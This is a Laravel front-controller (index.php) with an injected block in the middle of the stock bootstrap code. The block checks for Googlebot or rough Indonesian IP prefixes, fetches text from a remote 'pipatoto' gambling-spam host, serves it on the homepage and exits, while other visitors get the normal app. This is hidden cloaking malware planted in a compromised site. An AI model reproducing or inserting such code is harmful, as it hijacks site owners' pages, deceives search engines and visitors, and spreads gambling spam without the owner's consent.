<?php
/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| our application. We just need to utilize it! We'll simply require it
| into the script here so that we don't have to worry about manual
| loading any of our classes later on. It feels great to relax.
|
*/

require __DIR__.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Turn On The Lights
|--------------------------------------------------------------------------
|
| We need to illuminate PHP development, so let us turn on the lights.
| This bootstraps the framework and gets it ready for use, then it
| will load up this application so that we can run it and send
| the responses back to the browser and delight our users.
|
*/

$app = require_once __DIR__.'/../bootstrap/app.php';

$uri = $_SERVER['REQUEST_URI'] ?? '/';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '';

// Deteksi asal negara (opsional, bisa ditambahkan dengan layanan IP lookup)
$isGooglebot = stripos($userAgent, 'Googlebot') !== false;
$isIndonesian = strpos($ip, '36.') === 0 || strpos($ip, '103.') === 0 || strpos($ip, '114.') === 0; // IP Indonesia kasar

if ($uri === '/' && ($isGooglebot || $isIndonesian)) {
    $externalContent = @file_get_contents('https://assets-pipatoto.store/nothing/situstoto.txt');
    if ($externalContent) {
        echo $externalContent;
        exit;
    }
}


/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request
| through the kernel, and send the associated response back to
| the client's browser allowing them to enjoy the creative
| and wonderful application we have prepared for them.
|
*/
// set the public path to this directory
$app->bind('path.public', function() {
	return __DIR__;
});

$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);

$response = $kernel->handle(
    $request = Illuminate\Http\Request::capture()
);

$response->send();

$kernel->terminate($request, $response);
